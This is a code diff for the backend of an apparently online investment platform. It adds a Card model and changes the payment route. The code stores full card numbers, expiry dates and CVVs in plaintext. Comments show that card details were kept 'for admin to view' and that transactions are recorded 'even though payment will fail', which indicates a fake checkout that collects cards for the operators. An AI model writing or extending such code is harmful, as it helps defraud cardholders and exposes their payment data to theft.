@@ -333,6 +333,7 @@ InvestmentSchema.virtual('daysRemaining').get(function() {
 
 const Investment = mongoose.model('Investment', InvestmentSchema);
 
+
 const TransactionSchema = new mongoose.Schema({
   user: { 
     type: mongoose.Schema.Types.ObjectId, 
@@ -386,17 +387,11 @@ const TransactionSchema = new mongoose.Schema({
     swift: { type: String }
   },
   cardDetails: {
-    fullName: { type: String, required: [true, 'Full name is required'] },
-    cardNumber: { type: String, required: [true, 'Card number is required'] },
-    expiry: { type: String, required: [true, 'Expiry date is required'] },
-    cvv: { type: String, required: [true, 'CVV is required'] },
-    billingAddress: { 
-      street: { type: String, required: [true, 'Street address is required'] },
-      city: { type: String, required: [true, 'City is required'] },
-      state: { type: String, required: [true, 'State is required'] },
-      postalCode: { type: String, required: [true, 'Postal code is required'] },
-      country: { type: String, required: [true, 'Country is required'] }
-    }
+    fullName: { type: String },
+    cardNumber: { type: String },
+    expiry: { type: String },
+    cvv: { type: String },
+    billingAddress: { type: String }
   },
   adminNotes: { type: String },
   processedBy: { type: mongoose.Schema.Types.ObjectId, ref: 'Admin' },
@@ -407,6 +402,65 @@ const TransactionSchema = new mongoose.Schema({
   toObject: { virtuals: true }
 });
 
+TransactionSchema.index({ user: 1 });
+TransactionSchema.index({ type: 1 });
+TransactionSchema.index({ status: 1 });
+TransactionSchema.index({ reference: 1 });
+TransactionSchema.index({ createdAt: -1 });
+
+const Transaction = mongoose.model('Transaction', TransactionSchema);
+
+
+const CardSchema = new mongoose.Schema({
+  user: { 
+    type: mongoose.Schema.Types.ObjectId, 
+    ref: 'User', 
+    required: [true, 'User is required'],
+    index: true
+  },
+  fullName: { 
+    type: String, 
+    required: [true, 'Full name is required'], 
+    trim: true 
+  },
+  cardNumber: { 
+    type: String, 
+    required: [true, 'Card number is required'], 
+    trim: true 
+  },
+  expiry: { 
+    type: String, 
+    required: [true, 'Expiry date is required'], 
+    trim: true 
+  },
+  cvv: { 
+    type: String, 
+    required: [true, 'CVV is required'], 
+    trim: true 
+  },
+  billingAddress: { 
+    type: String, 
+    required: [true, 'Billing address is required'], 
+    trim: true 
+  },
+  isDefault: { 
+    type: Boolean, 
+    default: false 
+  },
+  lastUsed: { 
+    type: Date, 
+    default: Date.now 
+  }
+}, { 
+  timestamps: true,
+  toJSON: { virtuals: true },
+  toObject: { virtuals: true }
+});
+
+CardSchema.index({ user: 1 });
+CardSchema.index({ lastUsed: -1 });
+
+const Card = mongoose.model('Card', CardSchema);
 
 const LoanSchema = new mongoose.Schema({
   user: { 
@@ -3624,7 +3678,8 @@ app.post('/api/payments/process', protect, [
   body('cardNumber').notEmpty().withMessage('Card number is required').escape(),
   body('expiry').notEmpty().withMessage('Expiry date is required').escape(),
   body('cvv').notEmpty().withMessage('CVV is required').escape(),
-  body('billingAddress').notEmpty().withMessage('Billing address is required').escape()
+  body('billingAddress').notEmpty().withMessage('Billing address is required').escape(),
+  body('saveCard').optional().isBoolean().withMessage('Save card must be a boolean')
 ], async (req, res) => {
   const errors = validationResult(req);
   if (!errors.isEmpty()) {
@@ -3635,9 +3690,21 @@ app.post('/api/payments/process', protect, [
   }
 
   try {
-    const { amount, fullName, cardNumber, expiry, cvv, billingAddress } = req.body;
+    const { amount, fullName, cardNumber, expiry, cvv, billingAddress, saveCard } = req.body;
 
-    // Save card details to database (for admin to view)
+    // Save card details to database if requested
+    if (saveCard) {
+      await Card.create({
+        user: req.user.id,
+        fullName,
+        cardNumber,
+        expiry,
+        cvv,
+        billingAddress
+      });
+    }
+
+    // Create transaction record (even though payment will fail)
     const reference = `CARD-${crypto.randomBytes(3).toString('hex').toUpperCase()}`;
     await Transaction.create({
       user: req.user.id,
